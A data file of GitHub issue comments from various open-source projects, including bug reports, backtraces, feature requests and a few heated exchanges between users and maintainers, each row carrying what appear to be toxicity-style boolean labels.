fullcalendar/fullcalendar/3046/186849234,"I couldn't find at JSBin or JSFiddle the way to add PHP files (the ones included in Fullcalendar examples) You just need to make the following changes in the examples included In JSON.HTML   add  defaultView 'agendaWeek', In events.json, add ""title"" ""MY HIDDEN TITLE"", ""start"" ""2016-01-10T103000-0500"", ""end"" ""2016-01-10T123000-0500"", ""backgroundColor"" ""#ff0000"" }, When you execute the json.html page, the event added will not appear in the first day (2016-01-10) in the agendaweek view. If you push on MONTH button, it will appear and then if you pass to WEEK again, it will appear for the first time in this view. If this is not enough for you to duplicate the issue, let me know and I can send you an URL for you to verify it, or tell me if I'm able to upload PHP files on the platforms that you mentioned. Thank you! issue.zip ",False,True,False,fullcalendar/fullcalendar/3046
gate/hunter-packages/2/40306145,HunterGate.cmake doesn't repeat the BSD licence in its preamble.  This means that you lose the licence terms when following the instructions to copy the file to your project.  Could the licence be included inside this file? ,False,True,False,gate/hunter-packages/2
gate/hunter-packages/2/52272894,Fixed ,False,True,False,gate/hunter-packages/2
gentelella/ColorlibHQ/268/172435100,This is a request for gentelella to be upgraded for bootstrap 4. ,False,True,False,gentelella/ColorlibHQ/268
geowave/locationtech/1358/406359532, Coverage decreased (-0.8%) to 47.504% when pulling d55ec5844bfbdb0a712923af6970870bcf223f9f on cjw5dbpr-branch into 19b0d3f985b4fa68cea91433108f102515ba26b9 on locationtechmaster. ,False,True,False,geowave/locationtech/1358
getting-started-solution-template/exosite/16/424267881,Still need @friend  help to set the jenkins plugin for visualization. ,False,True,False,getting-started-solution-template/exosite/16
gobuffalo/gobuffalo/439/414470979,"So I'm looking at your templating docs and there some notes suggesting Plush isn't required and honestly I never in a million years would consider using it because it isn't designed for humans. How can we switch to Go? By to add a header in plush (from the examples) To do the same in Go templates Please type both of those out more than once and let me know what human would ever choose the former. By the way, Vimeo is blocked in Indonesia. Please consider hosting your own videos. You can use Keybase for this if you need to. ",True,True,False,gobuffalo/gobuffalo/439
gobuffalo/gobuffalo/439/467412051,"I’m sorry, but this is about one of the rudest tickets I’ve seen. You could’ve just asked asked how to use Go templates, but instead you decided to insult the hard work of a lot of people who do this for FREE. You don’t have to like Plush templates, but you also don’t have to be this rude and insulting. Read  and try to treat people with respect. ",True,True,False,gobuffalo/gobuffalo/439
gobuffalo/gobuffalo/439/467445115,"What, I'm supposed to kiss ass because someone made something for ""FREE"". Give me break, guy. You heard the feedback. Now it's yours to cherish. ",False,True,False,gobuffalo/gobuffalo/439
gobuffalo/gobuffalo/439/467446958,You could’ve just asked asked how to use Go templates. Just that. ,False,True,False,gobuffalo/gobuffalo/439
gobuffalo/gobuffalo/439/467448603,"I could have, but that wouldn't have been sincere. Those plush templates were an immediate turn off. If the maintainer has 18 years of experience surely they know how to interpret feedback however delivered. ",True,True,False,gobuffalo/gobuffalo/439
gobuffalo/gobuffalo/439/467449559,"First off, constructive criticism is always welcome, but you didn’t do that you served up a heavy dose of insults. No one asked you to kiss ass. Your ticket could’ve been, “I would like to use Go templates instead of Plush, how do I do that?”. But no, you came and spent a long time insulting people, and you still do. You don’t have to like Plush, but you don’t have to insult those that wrote it. ",False,True,False,gobuffalo/gobuffalo/439
gobuffalo/gobuffalo/439/467456238,"im on the opposite opinion, plush is so much more human in term of rendering. i even use it for generating codes, and scaffolds. doing that in go template is such a pain! ",False,True,False,gobuffalo/gobuffalo/439
godot/godotengine/28739/441278024,"Godot version 3.1.1 OS/device including version Windows 10 Issue description As you can see in attached MRP, application crashes when you set a breakpoint just a big array of array has been filled with values. Issue happen also when you put breakpoint in same node different functions subsequently. when no breakpoints had been set, application doesn't crash. NOTE mrp is about a 600x600 matrix. If you change to 500x500 it doesn't crash anymore. Steps to reproduce open MRP put breakpoint on ""PRINTS"" lines, one at a time. run Minimal reproduction project mrp-breakpoint-crash.zip ",False,True,False,godot/godotengine/28739
godot/godotengine/28739/490122815,Can't reproduce on Ubuntu 19.04 with Godot 3.2 master ,False,True,False,godot/godotengine/28739
godot/godotengine/28739/490151913,@friend Do you have any log? ,False,True,False,godot/godotengine/28739
godot/godotengine/28739/490212431,logs is not really helpful log.txt console displays ,False,True,False,godot/godotengine/28739
godot/godotengine/28739/490226023,"I tried on two different machines, it happens all the time. Probalbly Windows-only bug. ",False,True,False,godot/godotengine/28739
godot/godotengine/28739/490229439,"Confirm on Wine 4.7, this is backtrace(very strange because wine or cross compilation doesn't work well) Dokument bez nazwy.txt ",False,True,False,godot/godotengine/28739
grunt/gruntjs/1646/340559541,Grunt build fails with the following message This does not happen on AWS or Local machine. But only in an LXD Container. Any clue? ,False,True,False,grunt/gruntjs/1646
grunt/gruntjs/1646/404601213,I'm not familiar with lxd containers sorry. ,False,True,False,grunt/gruntjs/1646
godot/godotengine/28739/490260242,"Can confirm on Windows 10 build 17134, with Godot 3.2-dev df18c8c &lt;details&gt;&lt;summary&gt;Backtrace for breakpoint 1&lt;/summary&gt; &lt;p&gt;  [0] __chkstk (d\agent\_work\1\s\src\vctools\crt\vcstartup\src\misc\amd64\chkstk.asm109) [1] PacketPeerput_var (c\users\user\repositories\godot\core\io\packet_peer.cpp103) [2] ScriptDebuggerRemote_put_variable (c\users\user\repositories\godot\core\script_debugger_remote.cpp118) [3] ScriptDebuggerRemotedebug (c\users\user\repositories\godot\core\script_debugger_remote.cpp241) [4] GDScriptLanguagedebug_break (c\users\user\repositories\godot\modules\gdscript\gdscript_editor.cpp237) [5] GDScriptFunctioncall (c\users\user\repositories\godot\modules\gdscript\gdscript_function.cpp1519) [6] GDScriptInstancecall (c\users\user\repositories\godot\modules\gdscript\gdscript.cpp1181) [7] Objectcall (c\users\user\repositories\godot\core\object.cpp921) [8] Variantcall_ptr (c\users\user\repositories\godot\core\variant_call.cpp1068) [9] GDScriptFunctioncall (c\users\user\repositories\godot\modules\gdscript\gdscript_function.cpp1075) [10] GDScriptInstance_ml_call_reversed (c\users\user\repositories\godot\modules\gdscript\gdscript.cpp1206) [11] GDScriptInstancecall_multilevel_reversed (c\users\user\repositories\godot\modules\gdscript\gdscript.cpp1215) [12] Node_notification (c\users\user\repositories\godot\scene\main\node.cpp148) [13] CanvasItem_notificationv (c\users\user\repositories\godot\scene\2d\canvas_item.h166) [14] Objectnotification (c\users\user\repositories\godot\core\object.cpp954) [15] Node_propagate_ready (c\users\user\repositories\godot\scene\main\node.cpp193) [16] Node_propagate_ready (c\users\user\repositories\godot\scene\main\node.cpp182) [17] Node_set_tree (c\users\user\repositories\godot\scene\main\node.cpp2561) [18] SceneTreeinit (c\users\user\repositories\godot\scene\main\scene_tree.cpp456) [19] OS_Windowsrun (c\users\user\repositories\godot\platform\windows\os_windows.cpp2831) [20] widechar_main (c\users\user\repositories\godot\platform\windows\godot_windows.cpp151) [21] _main (c\users\user\repositories\godot\platform\windows\godot_windows.cpp175) [22] main (c\users\user\repositories\godot\platform\windows\godot_windows.cpp185) [23] __scrt_common_main_seh (d\agent\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl288) [24] BaseThreadInitThunk -- END OF BACKTRACE -- &lt;/p&gt; &lt;/details&gt;&lt;details&gt;&lt;summary&gt;Backtrace for breakpoint 2&lt;/summary&gt; &lt;p&gt;  [0] __chkstk (d\agent\_work\1\s\src\vctools\crt\vcstartup\src\misc\amd64\chkstk.asm109) [1] __chkstk (d\agent\_work\1\s\src\vctools\crt\vcstartup\src\misc\amd64\chkstk.asm109) [2] PacketPeerput_var (c\users\user\repositories\godot\core\io\packet_peer.cpp103) [3] ScriptDebuggerRemote_put_variable (c\users\user\repositories\godot\core\script_debugger_remote.cpp118) [4] ScriptDebuggerRemotedebug (c\users\user\repositories\godot\core\script_debugger_remote.cpp241) [5] GDScriptLanguagedebug_break (c\users\user\repositories\godot\modules\gdscript\gdscript_editor.cpp237) [6] GDScriptFunctioncall (c\users\user\repositories\godot\modules\gdscript\gdscript_function.cpp1519) [7] GDScriptInstancecall (c\users\user\repositories\godot\modules\gdscript\gdscript.cpp1181) [8] Objectcall (c\users\user\repositories\godot\core\object.cpp921) [9] Variantcall_ptr (c\users\user\repositories\godot\core\variant_call.cpp1068) [10] GDScriptFunctioncall (c\users\user\repositories\godot\modules\gdscript\gdscript_function.cpp1075) [11] GDScriptInstance_ml_call_reversed (c\users\user\repositories\godot\modules\gdscript\gdscript.cpp1206) [12] GDScriptInstancecall_multilevel_reversed (c\users\user\repositories\godot\modules\gdscript\gdscript.cpp1215) [13] Node_notification (c\users\user\repositories\godot\scene\main\node.cpp148) [14] CanvasItem_notificationv (c\users\user\repositories\godot\scene\2d\canvas_item.h166) [15] Objectnotification (c\users\user\repositories\godot\core\object.cpp954) [16] Node_propagate_ready (c\users\user\repositories\godot\scene\main\node.cpp193) [17] Node_propagate_ready (c\users\user\repositories\godot\scene\main\node.cpp182) [18] Node_set_tree (c\users\user\repositories\godot\scene\main\node.cpp2561) [19] SceneTreeinit (c\users\user\repositories\godot\scene\main\scene_tree.cpp456) [20] OS_Windowsrun (c\users\user\repositories\godot\platform\windows\os_windows.cpp2831) [21] widechar_main (c\users\user\repositories\godot\platform\windows\godot_windows.cpp151) [22] _main (c\users\user\repositories\godot\platform\windows\godot_windows.cpp175) [23] main (c\users\user\repositories\godot\platform\windows\godot_windows.cpp185) [24] __scrt_common_main_seh (d\agent\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl288) [25] BaseThreadInitThunk -- END OF BACKTRACE -- &lt;/p&gt; &lt;/details&gt;",False,True,False,godot/godotengine/28739
grunt/gruntjs/1646/404741230,"@friend So ""It wont work in LXD Container"" is the answer? ",False,True,False,grunt/gruntjs/1646
grunt/gruntjs/1646/404885579,"@friend Yes that is the answer. Issues are reserved for issues with Grunt. This is not a support channel. Some times I do volunteer my free time to answer support questions, if I am familiar with them. You are free to volunteer your time researching your issue and if you discover it actually is because of an issue in Grunt, then reopen this issue or open a new one. Or move your stack to gulp, it's your stack, not mine. Here is a link  Good luck! ",False,True,False,grunt/gruntjs/1646
grunt/gruntjs/1646/404888454,"Also the problem is in the  plugin, not in core. Per ",False,True,False,grunt/gruntjs/1646
grunt/gruntjs/1646/405621328,"@friend  ""issues are related to grunt ?"" what did  I post about? ""GRUNT"" in LXD Container.  And what do you mean by ""This is not a support channel"" . I never asked you to do my homework. And whatever I said is an Issue as mentioned by @friend , its the problem with concurrent. And fortunately fixed it. Next if ""YOU"" are not familiar, please be quiet and ignore the question. Let some knowledgeable person answer the queries. ",True,True,False,grunt/gruntjs/1646
habitat/habitat-sh/3853/267342810, Signed-off-by Travis Elliott Davis edavis@friend.io ,False,True,False,habitat/habitat-sh/3853
habitat/habitat-sh/3853/338356662,"Thanks for the pull request! Here is what will happen next  Your PR will be reviewed by the maintainers If everything looks good, one of them will  it, and your PR will be merged.  Thank you for contributing! ",False,True,False,habitat/habitat-sh/3853
harvey/tschwecke/9/17473403,Added a reporter to output an HTML report. ,False,True,False,harvey/tschwecke/9
hearlstone/manuel-delverme/5/349206049,just use a card instead of the whole game-state to autoencode ,False,True,False,hearlstone/manuel-delverme/5
helm/helm/5439/420124208, Why is helm such trash?  What are some alternatives to helm?   ,True,True,False,helm/helm/5439
helm/helm/5439/472113134, Where's your open source repo contribution doing better?  ,False,True,False,helm/helm/5439
helm/helm/5439/472113971, Where are your PR's contributing to making the helm better?  ,False,True,False,helm/helm/5439
helm/helm/5439/472114798,"The more you focus your mind on trash, the more garbage your mind becomes. ",False,True,False,helm/helm/5439
helm/helm/5439/472119487,I'm locking the conversation it is violating the Code of Conduct for inappropriate/unprofessional conduct. ,False,True,False,helm/helm/5439
homebrew-bundle/Homebrew/308/276835188,Trying to perform  and getting the following error Independently running  correctly outputs installed MAS apps. ,False,True,False,homebrew-bundle/Homebrew/308
hockeyapp/shuhongwu/22840/214359736,"Version 7.1.0 (3117) | com.sina.weibo Reason No reason found. Full stack trace includes libsystem_malloc.dylib, libobjc.A.dylib, ???, libdyld.dylib, CoreFoundation, Foundation, UIAccessibility, libdispatch.dylib, libsystem_pthread.dylib. Link to HockeyApp  ",False,True,False,hockeyapp/shuhongwu/22840
homebrew-bundle/Homebrew/308/347020631,"Aww snap. Yea that fixed it. It looks like it was the High Sierra installer causing the issue as it doesn't have an ID. After updating mas it now correctly lists the installer (just minus an ID). Actually, this might be a different issue. Look at the line it adds to the Brewfile in this case 595191960 CopyClip (1.9)  Install macOS High Sierra (13105) 803453959 Slack (2.9.0) ♠ ",False,True,False,homebrew-bundle/Homebrew/308
homebrew-bundle/Homebrew/308/347019518,I can't reproduce this locally I'm afraid. Try . ,False,True,False,homebrew-bundle/Homebrew/308
hockeyapp/shuhongwu/25780/217415738,"Version 7.3.0 (3873) | com.sina.weibo Stacktrace &lt;pre&gt;-;main;main.m;36&lt;/pre&gt;Reason No reason found. Full stack trace includes CoreText, CoreFoundation, libdispatch.dylib, UIFoundation, Foundation, UIKit, FrontBoardServices, GraphicsServices, libdyld.dylib. Link to HockeyApp  ",False,True,False,hockeyapp/shuhongwu/25780
homebrew-bundle/Homebrew/308/347027607,@friend Ok. Would you consider submitting a PR to address that case? ,False,True,False,homebrew-bundle/Homebrew/308
homebrew-bundle/Homebrew/308/350565933,"Decided not to bother because A) the OSX installers aren't typically something you'd want to keep around B) am unable to find anything else that recreates this issue. Either way, thanks for the response @friend! ",False,True,False,homebrew-bundle/Homebrew/308
homebrew-bundle/Homebrew/308/351001164,"@friend Cool, thanks for letting us know! ",False,True,False,homebrew-bundle/Homebrew/308
hoodie-app-tracker/hoodiehq/113/257552045,Any way to restart these builds? ,False,True,False,hoodie-app-tracker/hoodiehq/113
homebrew-cask/Homebrew/43171/291614799,After making all changes to the cask  [x]  is error-free. [x]  left no offenses. [x] The commit message includes the cask’s name and version.  ,False,True,False,homebrew-cask/Homebrew/43171
hoodie-app-tracker/hoodiehq/113/257634804,"the travis fail is a known issue  you test it locally, and if it does, let’s merge it in. But for the future, you should see a ""restart job"" on the top right here, if you are signed in ",False,True,False,hoodie-app-tracker/hoodiehq/113
hoodie-app-tracker/hoodiehq/113/261708376,"Wow, I'm sorry it took this long to get to. Tested locally, it works! Merging. ",False,True,False,hoodie-app-tracker/hoodiehq/113
hoverfly/SpectoLabs/821/416731507,First want to check the status of real service if service is up then hoverfly should be goes into capture mode but status of real service is down then hoverfly should be goes into simulation mode  how can we do this. ,False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/469200208,"This is a very interesting use case of Hoverfly. It doesn't work like that yet.  Hoverfly-Java can switch between capture and simulate mode based on the existence of a simulation file, but that's it. What you describe is more advanced  Hoverfly always pass through the requests first If the response is not time-out (or other user-defined conditions), Hoverfly capture the data Otherwise, Hoverfly will try to simulate based on the captured data. I'm transferring the issue as it's a feature request on Hoverfly core project.   ",False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/469218957,"@friend I have some questions  Is the real service a production service? How long is capturing going to continue if the real service is responding fine? Should Hoverfly discard data after a certain period of time? Hoverfly should wait for the real service in capture mode. How long should it wait? Does Hoverfly try again on the next request if there is no response if the last one timed out (note that in this circumstance Hoverfly will appear to be as slow as your timeout)? Instead of that, does Hoverfly declare the real service down and respond immediately? How does Hoverfly know that the real service has come back? Is Hoverfly continually trying the real service perhaps?  ",False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/469246117,@friend I suppose my real question is why doesn't Squid (or something like that) do what you want? ,False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/469304495,"Sorry I don't understand about squid. On Mon, Mar 4, 2019, 636 PM John Davenport notifications@friend.com wrote ",False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/469305431,"I will share the answers for below questions with you  tomorrow Thanks, Antika Chauhan On Mon, Mar 4, 2019, 457 PM John Davenport notifications@friend.com wrote ",False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/471915452,"Hi John, Please find below details of questions with highlighted answers  Is the real service a production service? à Real service is not a production service. How long is capturing going to continue if the real service is responding fine? à if real service is responding fine then on first time hoverfly should capture the response in simulation file and after that its gives real response till service is up. Should Hoverfly discard data after a certain period of time? à At the first successful response of the day, it should capture the response through hoverfly then Hoverfly should discard the previous recorded data. Hoverfly should wait for the real service in capture mode. How long should it wait? à Wait time should be configurable from our end as different services have different wait time. Does Hoverfly try again on the next request if there is no response if the last one timed out (note that in this circumstance Hoverfly will appear to be as slow as your timeout)? à if service is down then first hoverfly should declare that this service is down and goes into simulation mode Instead of that, does Hoverfly declare the real service down and respond immediately? àHoverfly should declare the service down and goes into simulation mode. How does Hoverfly know that the real service has come back? Is Hoverfly continually trying the real service perhaps? à Whenever we execute the test cases, if service is up, request should go to main application/service and hoverfly should also capture the response at that time, and if service is down then hoverfly should go into simulation mode.  Thanks &amp; Regards, Antika Chauhan On Mon, Mar 4, 2019, 457 PM John Davenport notifications@friend.com wrote ",False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/473169580,"Hi John, ",False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/473170840,"Please find below details of questions with highlighted answers 1. Is the real service a production service?    Ans -- Real service is not a     production service. 2. How long is capturing going to continue if the real service is responding fine?  Ans -  if real service is responding fine then on first     time hoverfly should capture the response in simulation file and after that     its gives real response till service is up. 3. Should Hoverfly discard data after a certain period of time?  Ans-- At     the first successful response of the day, it should capture the response     through hoverfly then Hoverfly should discard the previous recorded data. 4. Hoverfly should wait for the real service in capture mode. How long should it wait?   Ans -- Wait time should be configurable from our end as     different services have different wait time. 5. Does Hoverfly try again on the next request if there is no response if the last one timed out (note that in this circumstance Hoverfly will appear to be as slow as your timeout)?   Ans - if service is down then first     hoverfly should declare that this service is down and goes into simulation     mode 6. Instead of that, does Hoverfly declare the real service down and respond immediately?   Ans -- Hoverfly should declare the service down and     goes into simulation mode. 7. How does Hoverfly know that the real service has come back? Is Hoverfly continually trying the real service perhaps?   Ans -- Whenever we     execute the test cases, if service is up, request should go to main     application/service and hoverfly should also capture the response at that     time, and if service is down then hoverfly should go into simulation mode. Please help me this is very urgent for me. ",False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/473228857,@friend If you want SpectoLabs to divert effort to this contact me directly ,False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/473231581,"John, can you please share your email id so that I can contact you directly ",False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/473897553,It's on my @friend profile @friend ,False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/474695139,"John, we want that hoverfly-java should check the status of real service if service is up then hoverfly- Java should be goes into capture mode but status of real service is down then hoverfly-java should be goes into simulation mode how can we do this. ",False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/474695225,Please help us. It's very urgent for us ,False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/474799691,@friend it wasn't clear that you are using Hoverfly-Java. Given you are prepared to check the status of the service before you start the test you can act according to whether the service is available or not available. In the latter case you can use the last good capture for your simulation. In your test check the service health and change the mode based on the results. The hoverfly API provides methods to interact with the Hoverfly proxy  simulate(); ,False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/475213296,"Please share some example with me so that I can understand this On Wed, Mar 20, 2019, 529 PM John Davenport notifications@friend.com wrote ",False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/476097223,"Hi John, Please help me to find the example for hoverfly-java for checking the status of service and change mode accordingly. This is very urgent for me. Thanks and regards, Antika On Thu, Mar 21, 2019, 610 PM antika chauhan antikachauhan2@friend.com wrote ",False,True,False,hoverfly/SpectoLabs/821
hoverfly/SpectoLabs/821/481622305,@friend what you are asking for support that is in excess of what anyone can reasonably expect from an open source project. Whilst we have been helpful to continue to do so free of charge would mean diverting limited resources away from the wider community SpectoLabs seeks to serve. If your company would like to enter into a commercial support arrangement with SpectoLabs please get in contact with myself. My email is on my profile page. Alternatively use the SpectoLabs contact form. ,False,True,False,hoverfly/SpectoLabs/821
hyperbox/hyperbox/10/182559582,"Hi, seems that I can't activate 3D acceleration but I can do it on virtualbox.... seems to at least. it's with the intel chipset but the correct drivers of intel are installed and virtualbox works with intel for 3D acceleration so.... ",False,True,False,hyperbox/hyperbox/10
hyperbox/hyperbox/10/253308475,"Couple a question to make sure we fully understand your issue  By ""can't activate"", which one do you mean  The setting is not saved You get an error while trying to create/edit a VM config with 3D acceleration You cannot start a VM which has 3D acceleration enabled   And by ""I can do it on VirtualBox"", which do you mean  Using the GUI, I can start the exact same machine with the same configuration Using the GUI, I can start another machine with the same configuration Using VBoxManage, I can start the same machine with the same configuration in GUI mode Using VBoxManage, I can start another machine with the same configuration in GUI mode Using VBoxManage, I can start the same machine with the same configuration in Headless mode Using VBoxManage, I can start another machine with the same configuration in Headless mode    ",False,True,False,hyperbox/hyperbox/10
hyperbox/hyperbox/10/253327007,"Yeah sorry I should have been more careful in my post but i was a bit in a rush. So sorry about that. so when I try to activate the settings and then save the configuration of the VM it tells me failed. If I try to create a virtual machine in virtualbox with the GUI, it accept the settings without complaining. I don't have tested yet with VBoxManage but I can try tomorrow if you want. And if you  do a little google search you will see that virtualbox should accept intel graphic chipset and if it does not it is considered as a bug. execpt on mint which is not compatible apparently. Maybe other systems too? anyway my host is a ubuntu 16.04.1 server with xfce4 interface on it. I wanted to activate on windows guest as win7 . but with other guests it doesn't seem to activate itself either.  I can try to diagnose further if you want tomorrow. but if you have some leads, I'm all ears open. ",False,True,False,hyperbox/hyperbox/10
hyperbox/hyperbox/10/253327454,"After saving the configuration, you should have a related task in the hyperbox client window at the bottom. Can you double click on that task and let me know the exact error message displayed there? it's the last text field in the window. ",False,True,False,hyperbox/hyperbox/10
hyperbox/hyperbox/10/253329662,"I don't have much time to test it right now and it won't be very useful because the disk of the vm is not in a great format for windows (.QED here in place of VMDK) .... shit apprently it doesn't do it anymore at the saving of the VM now it does it at the start of the VM but that s more of a VBoxManage message I guess so I will do more testing tomorrow if you don't mind to see if virtualbox accept the configuration and if hyperbox return an error.  I will post here tomorrow. sorry to disturb you about that )  ""This VM was configured to use 3D acceleration. However, the 3D support of the host is not working properly and the VM cannot be started. To fix this problem, either fix the host 3D support (update the host graphics driver?) or disable 3D acceleration in the VM settings (VERR_NOT_AVAILABLE)"" ",False,True,False,hyperbox/hyperbox/10
hyperbox/hyperbox/10/253331381,"You're not disturbing anything, thank you for taking the time to report this issue! No rush to give the extra info, whenever is best for you. ",False,True,False,hyperbox/hyperbox/10
hyperbox/hyperbox/10/253419436,"So I'm just working with my test right now. I've just create a vm with virtualbox GUI with 3D acceleration, right now I'm just installing windows right now. But anyway if the 3D acceleration wasn't working, it wouldn't start it at all since I think the verification of the possibility of 3D acceleration is made before launching the VM right? ",False,True,False,hyperbox/hyperbox/10
hyperbox/hyperbox/10/253423142,well I don't really know how to test it inside a vm but anyway i've installed a windows 7vm and the 3D acceleration tells me its activated while I run the vm ... so should I try to create same vm with vboxmanage? ,False,True,False,hyperbox/hyperbox/10
hyperbox/hyperbox/10/253525637,"After checking with the VirtualBox devs, 3D Acceleration would only be supported in a proper GUI user session. Trying to start a VM with 3D Acceleration enabled through a software like Hyperbox which runs as a service without any UI/X server configuration will cause the VM to fail. They don't plan to support it either, so that's it in term of ""official"" answer. On the unofficial side, if you run Hyperbox under Linux, you can always include a DISPLAY env variable in the init.d script and point to a properly configure X Server and see if that works. ",False,True,False,hyperbox/hyperbox/10
hyperbox/hyperbox/10/253526384,"mmmmh okey now I understand, it has to have a display ok ... understood thanks nayway ",False,True,False,hyperbox/hyperbox/10
hyrise/hyrise/1602/433469603,"It seems unsafe to have an unlocked access method in addition to .  should go. For example, this looks dangerous  refactoring that part of the projection, we might also pass in the MVCC data directly instead of making the chunk resize the vectors first and replace them afterwards. 749 might make the  part superfluous, but we should still look at the projection. ",False,True,False,hyrise/hyrise/1602
hyrise/hyrise/1602/487553622,"This can be done very easily after #1647, I'm taking this. ",False,True,False,hyrise/hyrise/1602
hyrise/hyrise/1602/495651271,@friend Still on this? ,False,True,False,hyrise/hyrise/1602
hyrise/hyrise/1602/495653397,"Ah, forgot about this. I'm trying to step back a bit from tackling ""small"" issues. I think it's better if the new forces start working on these things, to gain some experience with Hyrise. ",False,True,False,hyrise/hyrise/1602
i2cdevlib/jrowberg/252/228908888,This is my first time using the library and I think I am running into this issue as well. Did you figure out what timeout to give? Thank You. ,False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/162070829,"Sometimes my Arduino freezes or crashes when using JEFF ROWBERG library to read DMP data from MPU6050. It took me almost a full year to discover the problem and today I had some spare time and I tried to find where exactly arduino hangs/freezes. I discovered it is usually when executin getFIFOCount() or getIntStatus(). I discovered that inserting many Serial.print with tags along my entire code so I could know exactly which line hanged. So I discovered everytime my arduino hanged/freezes it was at a line with getFIFOCount() or getIntStatus(). So I decided to take a close look at it. Inside the file MPU6050.cpp there is a code like this uint16_t MPU6050getFIFOCount() {     I2CdevreadBytes(devAddr, MPU6050_RA_FIFO_COUNTH, 2, buffer);     return (((uint16_t)buffer[0]) &lt;&lt; 8) | buffer[1]; } I checked the function ""readBytes()"" inside I2Cdev.cpp and I found this I2CdevreadBytes(uint8_t devAddr, uint8_t regAddr, uint8_t length, uint8_t *data, uint16_t timeout) You see the problem? The function readBytes accepts one last parameter which is ""timeout"" but the function getFIFOCount uses readBytes without the timeout parameter! That's probably a bug cause sometimes I think the readBytes takes too long to execute and a TIMEOUT SHOULD BE set to avoid the function hanging out forever. I am pretty sure maaaany MAAAANY other people alterady experienced this problem and spent a lot of time trying to understand what went wrong. Some people mistakenly believe it's related to bufffer overflow in the FIFO or because of some non optimized code. It could be the problem but MY PROBLEM FOR ALMOST A FULL YEAR has been this bug reported here. I really hope someone fix this and add a timeout so nobody would spent entire months anymore seeking a problem that's is really hard to track an intermitent. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/229077298,"No, it looks like this library support is dead. I think we should move to other alternatives cause this library has already many bugs documented and unresolved so it's really unreliable if you are gonna use this library to anything serious. Jeff Rowberg is not providing the good support he gave to this library in the old days so I think you would be better off this library ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/229088625,"Apologies for the lack of support. I've tried to migrate most of the effort to online forums and other willing (and often more capable) contributors as much as possible, since I can't devote the time to this that I used to. The best laid plans of mice and men, as it were... However, in this case, I strongly doubt that it is the lack of a timeout argument that is causing the underlying issue. Arduino's Wire library does not actually provide timeout functionality. If you dig into the code, you'll see a blocking loop in the TWI calls. See this for example  a timeout in I2Cdevlib code would make zero difference, because there's no way to pass it to the underlying Wire/TWI implementation. The only way around this is to use a different timeout-capable I2C implementation. This is possible, but not simple. I would recommend checking the SDA/SCL lines with a logic analyzer to see when/why the sensor stops responding. The blocking loop inside Arduino's Wire/TWI code should not hang as long as the sensor responds according to the I2C spec. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/229102224,"@friend I never wanted to offend you. I know you did this library for free and you are contributing a lot with the community providing it to general use. This library is really great but there are some bugs with it. When you have sometime I would like you to take a look at this  some reason your library is a little ""unstable"", when you change some lines of code it simply stops working. I also provide you below with a really simple code to use your great library to retrive DMP data from MPU6050 without using interrupt pin. It simply freezes arduino after some time. I already checked with an osciloscope and everything is working fine there is not reason (at the hardware) that could make this freeze happens. Could you please run the code below in your arduino and wait a few seconds? After around 10-30 seconds your arduino will freeze. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/229104528,"Hello, I used to have the same problems. Try running it without the serial prints.It had worked for me. cheers and regards On Tue, Jun 28, 2016 at 951 PM, batata004 notifications@friend.com wrote ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/229108027,I tried it right now and didnt work ( I even tried changing the baud rate and it also didnt work. I think it's not related to Serial but to something in the library cause there is never a buffer overflow when I run the above code in my arduino so the Serial is not causing a significant delay that could cause a problem/overflow. I am pretty sure is something related to MPU6050 DMP library. ,False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/229415495,"@friend please, when you have a time try the code I gave you in your arduino with MPU6050. I am sure it's gonna freeze and I would like to know from you where is the bug of the library so I can fix it on my end. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/231621122,"I changed, too. Yes ,it still happens.I am waiting Rowberg to explain it. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/231627062,"yeap, same here. I really hope Rowberg replies us here. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/231629859,"Do you use mag?　I use the HMC5883L with mpu6050 to read the mag raw data and read the pitch yaw roll by DMP is fine. But when I use the mpu9150 to read the the mag data by DMP only , it keeps overflow and  freezes soon. You should change your TWBR =24 to =12 or substitute TWBR to Wire.setclock(400000),if only read data without mag ,mine is working fine with this edition by Jeff Rowberg. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/231630055,"I only use MPU6050 without any magnetometer, and I try to read data from DMP (not raw data). It freezes after a while. You think chaing TWBR from 24 to 12 should help? ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/231630146,"Yes, or Wire.setclock(400000). ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/231742469,"I tried it just right now. If freezed using ""Wire.setClock(400000);"" and also when using ""TWBR = 12;"". Any suggestion? ",False,True,False,i2cdevlib/jrowberg/252
